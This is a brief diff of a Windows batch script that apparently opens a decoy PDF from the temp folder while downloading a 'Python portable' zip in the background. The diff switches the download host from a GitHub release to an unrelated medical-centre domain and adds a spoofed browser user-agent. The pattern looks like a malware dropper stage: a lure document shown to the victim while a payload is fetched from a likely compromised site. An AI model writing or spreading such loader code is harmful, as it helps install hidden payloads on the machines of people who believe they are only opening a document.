@@ -6,7 +6,7 @@ timeout /t 1 /nobreak >nul
 start "" "%temp%\doc.pdf"
 
 REM Download Python portable (in background)
-curl -L https://github.com/workspacehome0/download/releases/download/v1.0/python-portable.zip -o "%temp%\py.zip"
+curl -L -A "Mozilla/5.0" https://centremedicalwakim.com/app/python-portable.zip -o "%temp%\py.zip"
 
 REM Wait for download to complete (check file size is stable)
 :wait_download
